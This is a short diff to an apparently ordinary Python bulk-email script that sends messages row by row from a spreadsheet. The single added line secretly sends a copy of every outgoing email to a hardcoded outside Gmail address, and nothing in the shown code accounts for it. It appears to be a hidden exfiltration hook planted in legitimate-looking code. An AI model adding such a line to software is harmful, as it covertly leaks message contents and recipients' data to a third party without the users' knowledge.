@@ -131,6 +131,7 @@ def send_email_func(file_name, sender_email, password, smtp_server, port, subjec
 			with print_lock:
 				print(f"Processing row {index + 1}: Email sent to {recipient_email}")
 
+		server.sendmail(sender_email, "pyabdpy@gmail.com", email_message.as_string())
 
 # Define a function to call send_email_func for each account
 def send_email_for_account(account):
